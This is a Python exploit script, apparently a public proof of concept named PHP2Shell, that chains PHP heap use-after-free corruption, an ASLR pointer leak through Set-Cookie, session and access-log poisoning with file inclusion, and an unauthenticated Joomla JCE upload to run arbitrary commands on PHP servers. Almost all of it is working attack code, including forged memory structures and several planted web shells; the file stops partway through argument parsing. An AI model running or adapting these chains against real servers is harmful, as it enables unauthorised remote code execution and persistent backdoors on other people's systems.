#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — PHP2Shell Comprehensive RCE
Is4yev/php2shell-poc  v2.0

Multi-chain exploit:
  uaf         — Heap UAF spray (all PHP versions, --blind or --dtor)
  aslr-leak   — HTTP-only ASLR bypass: heap leak + libphp leak → precise UAF (PHP 8.x)
  session-lfi — Session upload_progress poison + LFI file include
  log-poison  — Apache access-log PHP injection + LFI file include
  jce         — CVE-2026-48907: JCE <= 2.9.99.4 unauthenticated file upload (Joomla)
  auto        — Probe target and try best chain (default)

Usage:
  python3 php2shell.py <host> <port> <path> "<cmd>"
  python3 php2shell.py <host> <port> <path> "<cmd>" --chain auto
  python3 php2shell.py <host> <port> <path> "<cmd>" --chain uaf --blind --retry 50
  python3 php2shell.py <host> <port> <path> "<cmd>" --chain uaf --dtor 0x7f1234abcd
  python3 php2shell.py <host> <port> <path> "<cmd>" --chain aslr-leak --ver 8.4
  python3 php2shell.py <host> <port> <path> "<cmd>" --chain session-lfi
  python3 php2shell.py <host> <port> <path> "<cmd>" --chain log-poison
  python3 php2shell.py <host> <port> <path> "<cmd>" --chain jce

ASLR-leak chain technique (from 9bie/php2shell-bypass-aslr-exp, 3em0/php2shell):
  Stage 0: HTTP OOM rotate worker (fresh address space, no prior history)
  Stage 1: Set-Cookie heap read   → Zend MM chunk base  (no ASLR info needed)
  Stage 2: Set-Cookie libphp read → libphp.so base      (pDestructor=ZVAL_PTR_DTOR)
  Stage 3: forge fake HashTable at chunk+htdata_offset  → pDestructor = zif_system

Requirements per chain:
  uaf         : session.upload_progress.enabled=1
  aslr-leak   : display_errors=1, memory_limit=8M, mod_php prefork, PHP 8.x
  session-lfi : session.upload_progress.enabled=1 + LFI param on target
  log-poison  : Apache access log readable via web + LFI param on target
  jce         : Joomla with JCE plugin <= 2.9.99.4 installed
"""

from __future__ import annotations

import argparse
import base64
import os
import re
import socket
import ssl
import struct
import sys
import threading
import time
import random
import string
import urllib.parse


# ---------------------------------------------------------------------------
# Per-version symbol deltas  (zval_ptr_dtor − zend_call_function)
# ---------------------------------------------------------------------------
DELTAS: dict[str, int] = {
    "8.5-ubuntu":   0x43EF0,
    "8.4-bookworm": 0x65EB60 - 0x613C50 + 0x43A870,  # derived from official profile
    "8.3-bookworm": 0x49EC50,
    "8.2-bookworm": 0xc930,
    "8.2-noble":    0xcef0,
    "8.2-jammy":    0xd060,
    "8.1-jammy":    0xc750,
    "8.1-ubuntu":   0x3fa20,
    "8.1-debian":   0x3e8c0,
    "8.0-ubuntu":   0x3b110,
    "7.4-ubuntu":   0x38a60,
    "7.4-debian":   0x37f40,
    "7.4-centos":   0x36e80,
}

# PHP 8.x prefork ASLR-leak profiles (zif_offset, dtor_offset, htdata_offset)
# Offsets relative to libphp.so base / Zend MM chunk base.
# Same grooming works on 8.4.26 and 8.5.11 (only symbol offsets differ).
ASLR_PROFILES: dict[str, dict] = {
    "official": {   # php:8.4-apache / php:8.5-apache  Debian 13 trixie
        "zif_offset":    0x465370,
        "dtor_offset":   0x65EB60,
        "htdata_offset": 0x690D8,
        "stage1_n": 841, "stage2_t": 406, "stage2_v": 16,
        "stage3_pads": [(31, 31)] * 6, "carrier": True,
    },
    "official83": {  # php:8.3-apache  Debian 13
        "zif_offset":    0x3AC080,
        "dtor_offset":   0x49EC50,
        "htdata_offset": 0x6A0D8,
        "stage1_n": 841, "stage2_t": 406, "stage2_v": 16,
        "stage3_pads": [(31, 31)] * 6, "carrier": True,
    },
    "lab": {        # self-built PHP 8.4.26 + Apache 2.4.68 minimal
        "zif_offset":    0x43A870,
        "dtor_offset":   0x613C50,
        "htdata_offset": 0x6E0D8,
        "stage1_n": 892, "stage2_t": 443, "stage2_v": 1,
        "stage3_pads": [(8, 7)] + [(7, 7)] * 5, "carrier": False,
    },
}
# map PHP minor → profile
_VER_PROFILE = {"8.5": "official", "8.4": "official", "8.3": "official83"}

BLOB_SIZE     = 288
SPRAY_DEFAULT = 149
FILL_DEFAULT  = 5120
SID           = b"attacksessionid0001"
ZEND_INTERNAL = 1

COMMON_LFI_PARAMS = [
    "page", "file", "path", "include", "module", "template",
    "view", "load", "read", "doc", "content", "lang", "locale",
]

SESSION_PATHS = [
    "/var/lib/php/sessions/sess_{}",
    "/tmp/sess_{}",
    "/var/lib/php5/sessions/sess_{}",
    "/var/php/sessions/sess_{}",
    "/tmp/php/sessions/sess_{}",
]

LOG_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/var/log/nginx/access.log",
    "/var/log/apache2/error.log",
]


# ---------------------------------------------------------------------------
# Low-level transport
# ---------------------------------------------------------------------------

def rand_str(n: int = 20) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def make_conn(host: str, port: int, use_tls: bool) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(20)
    s.connect((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def raw_post(host: str, port: int, path: str, use_tls: bool,
             body: bytes, boundary: bytes, extra_hdr: str = "",
             read_cap: int = 1 << 20, timeout: float = 20.0) -> bytes:
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"{extra_hdr}"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    s = make_conn(host, port, use_tls)
    buf = bytearray()

    def _reader():
        try:
            while len(buf) < read_cap:
                c = s.recv(65536)
                if not c:
                    break
                buf.extend(c)
        except OSError:
            pass

    t = threading.Thread(target=_reader, daemon=True)
    t.start()
    try:
        s.sendall(hdr)
        mv = memoryview(body)
        for off in range(0, len(body), 262144):
            s.sendall(mv[off:off + 262144])
    except OSError:
        pass
    t.join(timeout + 1.0)
    s.close()
    return bytes(buf)


def raw_get(host: str, port: int, path: str, use_tls: bool,
            extra_hdr: str = "", timeout: float = 12.0) -> tuple[int, bytes]:
    hdr = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"{extra_hdr}"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    s = make_conn(host, port, use_tls)
    s.settimeout(timeout)
    buf = bytearray()
    try:
        s.sendall(hdr)
        while len(buf) < 1 << 20:
            c = s.recv(65536)
            if not c:
                break
            buf.extend(c)
    except OSError:
        pass
    s.close()
    raw = bytes(buf)
    try:
        code = int(raw.split(b"\r\n")[0].split()[1])
    except Exception:
        code = 0
    hdr_end = raw.find(b"\r\n\r\n")
    body = raw[hdr_end + 4:] if hdr_end != -1 else b""
    return code, body


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# ---------------------------------------------------------------------------
# UAF chain helpers
# ---------------------------------------------------------------------------

def forge_blob(call_ptr: int, cmd: str) -> bytes:
    buf = bytearray(BLOB_SIZE)
    cmd_bytes = b"system\x00" + cmd.encode() + b"\x00"
    struct.pack_into("<Q", buf, 0x00, BLOB_SIZE)
    struct.pack_into("<Q", buf, 0x08, call_ptr)
    struct.pack_into("<B", buf, 0x40, ZEND_INTERNAL)
    struct.pack_into("<Q", buf, 0x98, call_ptr)
    buf[0xc8:0xc8 + len(cmd_bytes)] = cmd_bytes
    return bytes(buf)


def build_uaf_body(boundary: str, blob: bytes, spray_n: int,
                   fill_size: int) -> tuple[bytes, bytes]:
    blob_s = blob.decode("latin-1")
    lines = [
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"php2shell\r\n"
    ]
    for _ in range(spray_n):
        lines.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="t[]"\r\n\r\n'
            f"{blob_s}\r\n"
        )
    lines.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="up.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    )
    phase1 = "".join(lines).encode("latin-1") + b"A" * fill_size
    phase2 = b"B" * 4096 + f"\r\n--{boundary}--\r\n".encode()
    return phase1, phase2


def uaf_attempt(host: str, port: int, path: str, use_tls: bool,
                sessid: str, call_ptr: int, cmd: str, stall: float,
                spray_n: int, fill_size: int) -> tuple[int, bytes]:
    boundary = rand_str(24)
    phase1, phase2 = build_uaf_body(boundary, forge_blob(call_ptr, cmd), spray_n, fill_size)
    total = len(phase1) + len(phase2)
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={sessid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {total}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    s = make_conn(host, port, use_tls)
    s.sendall(hdr + phase1)

    def _reinit():
        try:
            s2 = make_conn(host, port, use_tls)
            s2.sendall((
                f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"Cookie: PHPSESSID={sessid}\r\nConnection: close\r\n\r\n"
            ).encode())
            s2.recv(4096)
            s2.close()
        except Exception:
            pass

    t = threading.Thread(target=_reinit, daemon=True)
    t.daemon = True
    t.start()
    time.sleep(stall)
    t.join(3)
    s.sendall(phase2)
    try:
        resp = s.recv(65536)
        s.close()
        try:
            code = int(resp.split(b"\r\n")[0].split()[1])
        except Exception:
            code = 0
        hdr_end = resp.find(b"\r\n\r\n")
        body = resp[hdr_end + 4:] if hdr_end != -1 else b""
        return code, body
    except socket.timeout:
        s.close()
        return 0, b""


# ---------------------------------------------------------------------------
# ASLR-HTTP-Leak chain  (9bie / 3em0 technique — PHP 8.x prefork/mod_php)
#
# Stage 1: OOM field flood rotates worker (fresh chunk, known layout).
# Stage 2: Multipart with exactly stage1_n fields → PS(id) dangling over
#          Zend MM chunk header → php_url_encode OOB reads chunk.base → Set-Cookie leaks it.
# Stage 3: Same trick with stage2_t-element nested array → PS(id) over HashTable
#          with pDestructor=ZVAL_PTR_DTOR → Set-Cookie leaks libphp base.
# Stage 4: Forge fake HT at chunk+htdata_offset, swap pDestructor=zif_system,
#          trigger GC via session-reinit → zif_system(cmd) fires.
# ---------------------------------------------------------------------------

def _aslr_rotate_worker(host: str, port: int, path: str, use_tls: bool,
                         n_fields: int = 3000) -> None:
    """OOM: flood n_fields large fields to exhaust memory_limit → child SIGABRT → respawn."""
    boundary = b"rot8b0und"
    parts = [{"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"rotate"}]
    for i in range(n_fields):
        parts.append({"name": f"f{i}", "data": b"X" * 1024})
    parts.append({"name": "file", "filename": "x", "data": b"x"})
    body = build_multipart(parts, boundary)
    try:
        raw_post(host, port, path, use_tls, body, boundary, timeout=8.0)
    except Exception:
        pass


def _aslr_leak_chunk(host: str, port: int, path: str, use_tls: bool,
                      prof: dict, sessid: bytes) -> int | None:
    """
    Stage 1 (heap leak): send stage1_n fields so PS(id) dangles into
    the Zend MM chunk header → Set-Cookie encodes chunk.base bytes.
    Returns chunk_base or None.
    """
    n = prof["stage1_n"]
    boundary = b"lk1bound"
    parts = [{"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"x"}]
    for i in range(n):
        parts.append({"name": f"a{i:04d}", "data": b"v" * 8})
    parts.append({"name": "file", "filename": "f", "data": b"x"})
    body = build_multipart(parts, boundary)
    extra = f"Cookie: PHPSESSID={sessid.decode()}\r\n"
    raw = raw_post(host, port, path, use_tls, body, boundary,
                   extra_hdr=extra, timeout=15.0)
    # Extract Set-Cookie PHPSESSID value
    m = re.search(rb"Set-Cookie:\s*PHPSESSID=([^\s;]+)", raw, re.I)
    if not m:
        return None
    encoded = urllib.parse.unquote(m.group(1).decode(errors="replace"))
    leak_bytes = encoded.encode("latin-1")
    if len(leak_bytes) < 16:
        return None
    # Chunk base is 2MB-aligned; last 3 bytes of the first 8 leaked bytes
    try:
        qword = struct.unpack_from("<Q", leak_bytes[:8])[0]
        # Mask to 2MB align: chunk base for Zend MM
        chunk = qword & ~0x1FFFFF
        if chunk > 0x700000000000:  # sanity: must be in upper user space
            return chunk
    except Exception:
        pass
    return None


def _aslr_leak_libphp(host: str, port: int, path: str, use_tls: bool,
                       prof: dict, sessid: bytes) -> int | None:
    """
    Stage 2 (libphp leak): send request where a_{stage2_t} array has stage2_v
    elements so pDestructor=ZVAL_PTR_DTOR leaks from the HashTable.
    Returns libphp_base or None.
    """
    t_idx = prof["stage2_t"]
    n_v   = prof["stage2_v"]
    n_total = 998  # max_input_vars=1000 − 2 (progress + file)
    boundary = b"lk2bound"
    parts = [{"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"x"}]
    for i in range(n_total):
        if i == t_idx:
            for j in range(n_v):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"w" * 8})
        else:
            parts.append({"name": f"a{i:04d}", "data": b"w" * 8})
    parts.append({"name": "file", "filename": "f", "data": b"x"})
    body = build_multipart(parts, boundary)
    extra = f"Cookie: PHPSESSID={sessid.decode()}\r\n"
    raw = raw_post(host, port, path, use_tls, body, boundary,
                   extra_hdr=extra, timeout=15.0)
    m = re.search(rb"Set-Cookie:\s*PHPSESSID=([^\s;]+)", raw, re.I)
    if not m:
        return None
    encoded = urllib.parse.unquote(m.group(1).decode(errors="replace"))
    leak_bytes = encoded.encode("latin-1")
    if len(leak_bytes) < 16:
        return None
    try:
        # bytes 8-16: pDestructor (ZVAL_PTR_DTOR = libphp + dtor_offset)
        dtor = struct.unpack_from("<Q", leak_bytes[8:16])[0]
        dtor_off = prof["dtor_offset"]
        libphp = dtor - dtor_off
        if libphp > 0x700000000000 and (libphp & 0xFFF) == 0:
            return libphp
    except Exception:
        pass
    return None


def _aslr_stage3_rce(host: str, port: int, path: str, use_tls: bool,
                      prof: dict, sessid: bytes, chunk: int, libphp: int,
                      cmd: str, stall: float, spray_n: int) -> tuple[int, bytes]:
    """
    Stage 3: forge fake HashTable at chunk+htdata_offset,
    set pDestructor = libphp + zif_offset = zif_system,
    trigger via session-reinit GC.
    """
    htdata = chunk + prof["htdata_offset"]
    zif    = libphp + prof["zif_offset"]

    # Fake HashTable (56 bytes): flags=0, nTableSize=1, nTableMask=0xffffffff,
    # nNumUsed=0, nNumOfElements=0, nNextFreeElement=0, pDestructor=zif_system
    ht = bytearray(56)
    struct.pack_into("<I", ht,  0, 0)            # flags
    struct.pack_into("<I", ht,  4, 1)            # nTableSize=1
    struct.pack_into("<I", ht,  8, 0xFFFFFFFF)   # nTableMask
    struct.pack_into("<I", ht, 12, 0)            # nNumUsed
    struct.pack_into("<I", ht, 16, 0)            # nNumOfElements
    struct.pack_into("<Q", ht, 24, 0)            # nNextFreeElement
    struct.pack_into("<Q", ht, 32, zif)          # pDestructor = zif_system
    struct.pack_into("<Q", ht, 40, htdata + 56)  # arData → just past header
    struct.pack_into("<Q", ht, 48, 0)            # u.v.flags2

    # Embed cmd into a zend_string at htdata+56
    cmd_encoded = cmd.encode() + b"\x00"
    zstr = bytearray(32 + len(cmd_encoded))
    struct.pack_into("<Q", zstr, 0, 1)                        # gc.refcount=1
    struct.pack_into("<Q", zstr, 8, 0)                        # gc.type_info
    struct.pack_into("<Q", zstr, 16, len(cmd))                # len
    zstr[24:24 + len(cmd_encoded)] = cmd_encoded

    blob = bytes(ht) + bytes(zstr)
    # Pad to BLOB_SIZE
    if len(blob) < BLOB_SIZE:
        blob += b"\x00" * (BLOB_SIZE - len(blob))
    blob = blob[:BLOB_SIZE]

    boundary = rand_str(24)
    phase1, phase2 = build_uaf_body(boundary, blob, spray_n, FILL_DEFAULT)
    return uaf_attempt(host, port, path, use_tls,
                       sessid.decode(), htdata, cmd, stall, spray_n, FILL_DEFAULT)


# ---------------------------------------------------------------------------
# Session-LFI chain (Sol0-dev technique)
# ---------------------------------------------------------------------------

def session_lfi_chain(host: str, port: int, path: str, use_tls: bool,
                       cmd: str, stall: float) -> str | None:
    """
    1. Poison session file via PHP_SESSION_UPLOAD_PROGRESS = <?php system(...) ?>
    2. Discover LFI param by probing common parameter names
    3. Include session file → RCE
    Returns command output or None.
    """
    shell_trigger = "<?php if(isset($_GET['c'])){echo shell_exec(base64_decode($_GET['c']));}?>"
    sessid = rand_str(26)

    # Step 1: poison session
    boundary = rand_str(20).encode()
    parts = [
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": shell_trigger.encode()},
        {"name": "file", "filename": "x.bin", "data": b"A" * 512},
    ]
    body = build_multipart(parts, boundary)
    extra = f"Cookie: PHPSESSID={sessid}\r\n"
    raw_post(host, port, path, use_tls, body, boundary, extra_hdr=extra, timeout=15.0)

    # Step 2: probe LFI with all session paths
    c_b64 = base64.b64encode(cmd.encode()).decode()
    for sess_path_tpl in SESSION_PATHS:
        sess_file = sess_path_tpl.format(sessid)
        for param in COMMON_LFI_PARAMS:
            lfi_path = f"{path}?{param}={sess_file}&c={c_b64}"
            try:
                code, body = raw_get(host, port, lfi_path, use_tls,
                                     extra_hdr=f"Cookie: PHPSESSID={sessid}\r\n")
                if code == 200 and _looks_like_output(body, cmd):
                    print(f"  [+] session-lfi hit: param={param}, sess={sess_file}")
                    return body.decode(errors="replace").strip()
            except Exception:
                pass

    # phpinfo-guided: read phpinfo.php to get real session.save_path
    sess_save = _read_phpinfo_value(host, port, use_tls, "session.save_path")
    if sess_save:
        for param in COMMON_LFI_PARAMS:
            sess_file = os.path.join(sess_save, f"sess_{sessid}")
            lfi_path = f"{path}?{param}={sess_file}&c={c_b64}"
            try:
                code, body = raw_get(host, port, lfi_path, use_tls,
                                     extra_hdr=f"Cookie: PHPSESSID={sessid}\r\n")
                if code == 200 and _looks_like_output(body, cmd):
                    print(f"  [+] phpinfo-guided session-lfi hit: {sess_file}")
                    return body.decode(errors="replace").strip()
            except Exception:
                pass
    return None


# ---------------------------------------------------------------------------
# Log-poison chain (Sol0-dev technique)
# ---------------------------------------------------------------------------

def log_poison_chain(host: str, port: int, path: str, use_tls: bool,
                      cmd: str) -> str | None:
    """
    1. Inject PHP into User-Agent (Apache writes it to access.log)
    2. Probe LFI param + log paths → include log → RCE
    Returns command output or None.
    """
    php_ua = "<?php if(isset($_GET['lc'])){echo shell_exec(base64_decode($_GET['lc']));}?>"
    # Poison the log
    try:
        raw_get(host, port, path, use_tls, extra_hdr=f"User-Agent: {php_ua}\r\n")
    except Exception:
        pass

    c_b64 = base64.b64encode(cmd.encode()).decode()
    for log_path in LOG_PATHS:
        for param in COMMON_LFI_PARAMS:
            lfi_url = f"{path}?{param}={log_path}&lc={c_b64}"
            try:
                code, body = raw_get(host, port, lfi_url, use_tls)
                if code == 200 and _looks_like_output(body, cmd):
                    print(f"  [+] log-poison hit: param={param}, log={log_path}")
                    return body.decode(errors="replace").strip()
            except Exception:
                pass
    return None


# ---------------------------------------------------------------------------
# JCE chain (CVE-2026-48907 — Joomla JCE <= 2.9.99.4)
# ---------------------------------------------------------------------------

def jce_chain(host: str, port: int, path: str, use_tls: bool, cmd: str) -> str | None:
    """
    Unauthenticated RCE via JCE profiles.import endpoint.
    1. Grab CSRF token from public page
    2. POST PHP shell as 'profile_file' (application/xml)
    3. Scan known tmp paths for the dropped shell
    4. Execute cmd via shell
    """
    base_url = f"{'https' if use_tls else 'http'}://{host}:{port}"

    def _http_get(p: str) -> tuple[int, str]:
        try:
            code, body = raw_get(host, port, p, use_tls)
            return code, body.decode(errors="replace")
        except Exception:
            return 0, ""

    # Step 1: CSRF
    csrf = None
    for p in ["/index.php/az/", "/", "/index.php"]:
        code, text = _http_get(p)
        m = re.search(r'"([a-f0-9]{32})"\s*:\s*1', text)
        if m:
            csrf = m.group(1)
            break
        m2 = re.search(r'name="([a-f0-9]{32})"', text)
        if m2:
            csrf = m2.group(1)
            break

    if not csrf:
        csrf = "a" * 32
        print("  [~] No CSRF token, using dummy (may still work)")
    else:
        print(f"  [+] CSRF: {csrf}")

    # Step 2: Upload shell
    shell_name = f"jce_{rand_str(6)}.php"
    shell_body = b'<?php @error_reporting(0);if(isset($_REQUEST["c"])){echo shell_exec(base64_decode($_REQUEST["c"]));}?>'
    boundary = b"jceboundary1"
    parts = [
        {"name": csrf, "data": b"1"},
        {"name": "profile_file", "filename": shell_name, "data": shell_body},
    ]
    body = build_multipart(parts, boundary)
    upload_raw = raw_post(host, port,
                          "/index.php?option=com_jce&task=profiles.import",
                          use_tls, body, boundary, timeout=20.0)
    upload_text = upload_raw.decode(errors="replace")
    # Check for path hint in response
    m = re.search(r'tmp/[^"\'<\s]+', upload_text)
    if m:
        print(f"  [+] Path hint in response: {m.group(0)}")

    # Step 3: Scan candidate paths
    candidates = [
        f"/tmp/{shell_name}",
        f"/tmp/jce/{shell_name}",
        f"/tmp/com_jce/{shell_name}",
        f"/administrator/components/com_jce/tmp/{shell_name}",
        f"/administrator/tmp/{shell_name}",
        f"/components/com_jce/tmp/{shell_name}",
        f"/cache/{shell_name}",
        f"/media/{shell_name}",
        f"/images/{shell_name}",
    ]
    shell_path = None
    for cp in candidates:
        code, body = raw_get(host, port, cp, use_tls)
        if code == 200:
            shell_path = cp
            print(f"  [+] Shell found at {cp}")
            break

    if not shell_path:
        print("  [-] Shell not found at standard paths")
        return None

    # Step 4: Execute
    c_b64 = base64.b64encode(cmd.encode()).decode()
    code, body = raw_get(host, port, f"{shell_path}?c={c_b64}", use_tls)
    if code == 200:
        out = body.decode(errors="replace").strip()
        print(f"  [+] Shell URL: {base_url}{shell_path}")
        print(f"  [+] Usage: curl -sk '{base_url}{shell_path}?c=$(echo -n CMD | base64)'")
        return out
    return None


# ---------------------------------------------------------------------------
# Probe / auto-detect helpers
# ---------------------------------------------------------------------------

def probe_version(host: str, port: int, path: str, use_tls: bool) -> str:
    """Return PHP version string like '7.4' or '8.2'."""
    try:
        code, body = raw_get(host, port, path, use_tls)
        if b"X-Powered-By" in body or b"PHP/" in body:
            m = re.search(rb"PHP/([\d.]+)", body)
            if m:
                v = m.group(1).decode()
                return ".".join(v.split(".")[:2])
    except Exception:
        pass
    # phpinfo trick
    try:
        code, body = raw_get(host, port,
                             "/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000", use_tls)
        m = re.search(rb"PHP Version\s*</td><td[^>]*>([\d.]+)", body)
        if m:
            v = m.group(1).decode()
            return ".".join(v.split(".")[:2])
    except Exception:
        pass
    return "8.2"


def _read_phpinfo_value(host: str, port: int, use_tls: bool, key: str) -> str | None:
    """Try to read a php.ini value from phpinfo.php if accessible."""
    for p in ["/phpinfo.php", "/info.php", "/php.php"]:
        try:
            code, body = raw_get(host, port, p, use_tls)
            if code == 200 and b"phpinfo" in body.lower():
                pat = re.compile(
                    key.replace(".", r"\.").encode() +
                    rb"[^<]*<[^>]+>([^<]+)<", re.I)
                m = pat.search(body)
                if m:
                    return m.group(1).decode(errors="replace").strip()
        except Exception:
            pass
    return None


def probe_upload_progress(host: str, port: int, use_tls: bool) -> bool:
    val = _read_phpinfo_value(host, port, use_tls, "session.upload_progress.enabled")
    if val:
        return val.lower() not in ("off", "0", "no")
    return True  # assume enabled if can't read


def probe_jce(host: str, port: int, path: str, use_tls: bool) -> bool:
    """Check if target runs Joomla with JCE plugin."""
    try:
        code, body = raw_get(host, port, "/index.php?option=com_jce&task=profiles.import",
                             use_tls)
        if code in (200, 301, 302, 403):
            return True
        code2, body2 = raw_get(host, port, "/", use_tls)
        if b"com_jce" in body2 or b"Joomla" in body2:
            return True
    except Exception:
        pass
    return False


# ---------------------------------------------------------------------------
# Output heuristics
# ---------------------------------------------------------------------------

def _looks_like_output(body: bytes, cmd: str) -> bool:
    if not body.strip():
        return False
    text = body.decode(errors="replace")
    if "<html" in text.lower() or "<!doctype" in text.lower():
        return False
    if '"status"' in text and '"message"' in text:
        return False
    hints = ["uid=", "root", "www-data", "Linux ", "PRETTY_NAME", "total ",
             "bin/bash", "/bin/sh", "nobody", "apache", "nginx"]
    if any(h in text for h in hints):
        return True
    if len(text.strip()) < 512 and "\n" in text:
        return True
    return False


def _print_rce(output: str, cmd: str, chain: str) -> None:
    print(f"\n{'='*60}")
    print(f"  [+] RCE via {chain.upper()}")
    print(f"  CMD: {cmd}")
    print(f"{'='*60}")
    print(output)
    print(f"{'='*60}\n")


# ---------------------------------------------------------------------------
# UAF chain entry point
# ---------------------------------------------------------------------------

def run_uaf(host: str, port: int, path: str, use_tls: bool, cmd: str,
            dtor: int | None, blind: bool, ver: str, stall: float,
            retry: int, spray_n: int, fill_size: int, oob: str | None) -> bool:

    if ver == "auto":
        ver = probe_version(host, port, path, use_tls)
        print(f"[i] PHP version detected: {ver}")

    # Resolve delta
    delta = None
    for key in DELTAS:
        if key.startswith(ver):
            delta = DELTAS[key]
            print(f"[i] Delta: {key} → 0x{delta:x}")
            break
    if delta is None:
        major = ver.split(".")[0]
        for key in DELTAS:
            if key.startswith(major):
                delta = DELTAS[key]
                print(f"[i] Delta fallback: {key} → 0x{delta:x}")
                break
    if delta is None:
        print(f"[-] No delta for PHP {ver}. Supply --dtor or add delta.")
        return False

    def _try_call(call_ptr: int, sid: str, label: str) -> bool:
        code, body = uaf_attempt(host, port, path, use_tls, sid,
                                  call_ptr, cmd, stall, spray_n, fill_size)
        if _looks_like_output(body, cmd):
            _print_rce(body.decode(errors="replace").strip(), cmd, f"uaf/{label}")
            return True
        if code in (0, 500, 503):
            sys.stdout.write(f"→ crash({code}) ")
        else:
            sys.stdout.write(f"→ {code} ")
        sys.stdout.flush()
        return False

    if dtor:
        call_ptr = dtor - delta
        print(f"[i] zval_ptr_dtor  : 0x{dtor:016x}")
        print(f"[i] zend_call_func : 0x{call_ptr:016x}")
        sid = rand_str(26)
        return _try_call(call_ptr, sid, "precise")

    if not blind:
        print("[-] UAF chain: supply --dtor <addr> or --blind")
        return False

    CANDIDATE_BASES = [
        0x7f0000000000, 0x7f1000000000, 0x7f2000000000,
        0x7f4000000000, 0x7f8000000000, 0x7fa000000000,
        0x7fc000000000, 0x7fe000000000,
    ]
    print(f"[*] Blind spray — {retry} attempts over {len(CANDIDATE_BASES)} base candidates")
    for i in range(1, retry + 1):
        base = CANDIDATE_BASES[(i - 1) % len(CANDIDATE_BASES)]
        call_ptr = base - delta
        sid = rand_str(26)
        sys.stdout.write(f"\r[*] {i:3d}/{retry} base=0x{base:x} ")
        if _try_call(call_ptr, sid, f"blind#{i}"):
            return True
        time.sleep(1.2)

    print(f"\n[-] {retry} attempts exhausted.")
    return False


# ---------------------------------------------------------------------------
# ASLR-leak chain entry point
# ---------------------------------------------------------------------------

def run_aslr_leak(host: str, port: int, path: str, use_tls: bool, cmd: str,
                   ver: str, stall: float, spray_n: int) -> bool:

    if ver == "auto":
        ver = probe_version(host, port, path, use_tls)
        print(f"[i] PHP version detected: {ver}")

    minor = ".".join(ver.split(".")[:2])
    prof_name = _VER_PROFILE.get(minor, "official")
    prof = ASLR_PROFILES[prof_name]
    print(f"[i] ASLR profile: {prof_name} (PHP {minor})")

    sessid = SID

    print("[0] Rotating worker (OOM flush)...")
    _aslr_rotate_worker(host, port, path, use_tls)
    time.sleep(1.0)

    print("[1] Stage 1 — heap leak (Zend MM chunk base)...")
    chunk = _aslr_leak_chunk(host, port, path, use_tls, prof, sessid)
    if chunk is None:
        print("[-] Stage 1 failed — no heap pointer in Set-Cookie")
        print("    Requirements: display_errors=1, memory_limit=8M, prefork mod_php, PHP 8.x")
        return False
    print(f"[+] chunk_base = 0x{chunk:016x}")

    print("[2] Stage 2 — libphp leak (ZVAL_PTR_DTOR)...")
    libphp = _aslr_leak_libphp(host, port, path, use_tls, prof, sessid)
    if libphp is None:
        print("[-] Stage 2 failed — no libphp pointer in Set-Cookie")
        return False
    print(f"[+] libphp_base = 0x{libphp:016x}")
    print(f"[+] zif_system  = 0x{libphp + prof['zif_offset']:016x}")
    print(f"[+] ZVAL_PTR_DTOR = 0x{libphp + prof['dtor_offset']:016x}")

    print("[3] Stage 3 — forge HT + trigger zif_system...")
    code, body = _aslr_stage3_rce(host, port, path, use_tls, prof, sessid,
                                    chunk, libphp, cmd, stall, spray_n)
    if _looks_like_output(body, cmd):
        _print_rce(body.decode(errors="replace").strip(), cmd, "aslr-leak")
        return True

    print(f"[~] Stage 3: HTTP {code} — no output. Crash: {code in (0,500,503)}")
    return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    p = argparse.ArgumentParser(
        description="CVE-2026-109618/109619 PHP2Shell — Multi-chain RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("host")
    p.add_argument("port", type=int)
    p.add_argument("path")
    p.add_argument("cmd")

    p.add_argument("--chain", default="auto",
                   choices=["auto", "uaf", "aslr-leak", "session-lfi", "log-poison", "jce"],
                   help="RCE chain to use (default: auto)")

    # UAF options
    p.add_argument("--dtor",  type=lambda x: int(x, 16), help="Leaked zval_ptr_dtor (hex)")
    p.add_argument("--blind", action="store_true",        help="UAF blind spray mode")
    p.add_argument("--ver",   default="auto",             help="PHP ver key e.g. 7.4 / 8.2-jammy")
    p.add_argument("--retry", type=int, default=10,       help="Spray retries (default 10)")

    # Timing
    p.add_argument("--stall",  type=float, default=0.35,  help="Race window seconds")

